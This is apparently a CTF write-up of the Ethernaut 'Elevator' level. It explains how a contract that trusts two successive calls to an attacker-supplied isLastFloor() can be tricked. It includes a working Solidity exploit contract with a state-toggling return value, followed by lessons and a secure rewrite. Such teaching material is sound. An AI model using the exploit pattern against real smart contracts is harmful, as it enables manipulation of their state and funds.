---
title: 'Ethernaut - Elevator'
description: 'Exploiting state-manipulating interface implementations to bypass flow controls. Learn why relying on external untrusted contract state returns can break smart contract invariants.'
date: 2025-07-11
tags: ['solidity', 'security', 'interfaces', 'state-manipulation', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🛗 Elevator - The Infinite Floor

## Challenge Overview

The objective of this level is to make the elevator reach the **top floor** of the building.

**The Catch:** The `Elevator` contract checks if the requested floor is the last floor by calling an external contract's `isLastFloor()` function. It requires that the floor is *not* the last floor initially, but then sets `top` to `true` if it *is* the last floor!

---

## Technical Analysis

### Vulnerability: Untrusted External Contract State Reliance

The `Elevator` contract uses an interface `Building` and depends on it to determine floor states:

```solidity
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

#### The Root Cause
This is an architectural flaw where a contract relies on an external, untrusted contract to return consistent state values:
1. **No Constant Guarantee**: The `isLastFloor` function in `Building` interface is **not** marked as `view` or `pure`. This means it can modify state or return different values across consecutive invocations in the same transaction.
2. **Double Querying**: The `goTo()` function queries `isLastFloor()` twice:
   * First check: `if (!building.isLastFloor(_floor))` - wants `false` to enter the conditional block.
   * Second execution: `top = building.isLastFloor(floor)` - wants `true` to set `top = true`.
3. **Attacker Control**: Since `Building` is instantiated using `msg.sender`, we can deploy a malicious contract implementing the `Building` interface that returns `false` on the first call and `true` on the second call.

---

## The Exploit: The Multi-Step Solution

1. **Deploy an Attack Contract**: Deploy a contract that implements the `Building` interface.
2. **Implement Toggle Logic**: Use a state variable (e.g., a boolean flag `isCalled`) to track whether the function has been called.
   * First call: set `isCalled = true` and return `false`.
   * Second call: return `true`.
3. **Trigger the Ride**: Call `goTo()` on the target `Elevator` contract from our attacker contract.

---

## Proof of Concept (PoC)

Below is the Solidity exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract BuildingExploit {
    IElevator public immutable target;
    bool public toggle = true;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function attack() external {
        target.goTo(10);
    }

    // Implementing the Building interface
    function isLastFloor(uint256) external returns (bool) {
        // Toggle returns: 1st call -> false, 2nd call -> true
        toggle = !toggle;
        return !toggle;
    }
}
```

Deploy this contract using Remix, passing the `Elevator` instance address, and call `attack()`.

---

## Auditor's Lessons

1. **Never Trust External State Queries**: External contracts are completely untrusted. Avoid making logical control flow decisions based on consecutive results returned from external non-view functions.
2. **Enforce Interface View Modifiers**: If your contract must rely on external interface queries, ensure those queries are explicitly marked as `view` or `pure` in the interface definition. This warns the compiler that the function should not modify state, though an attacker can still implement read-only state changes (e.g., reading `gasleft()` or increasing block numbers).
3. **Internal State Validation**: Keep state logic internal to your own contract rather than delegating it to user-controlled addresses.

---

## Remediation

Store the building configuration internally or restrict who can implement the `Building` registry:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureElevator {
    bool public top;
    uint256 public floor;
    uint256 public constant LAST_FLOOR = 100;

    // Securely determine the top floor internally
    function goTo(uint256 _floor) external {
        require(_floor <= LAST_FLOOR, "Floor does not exist");
        
        floor = _floor;
        if (floor == LAST_FLOOR) {
            top = true;
        } else {
            top = false;
        }
    }
}
```
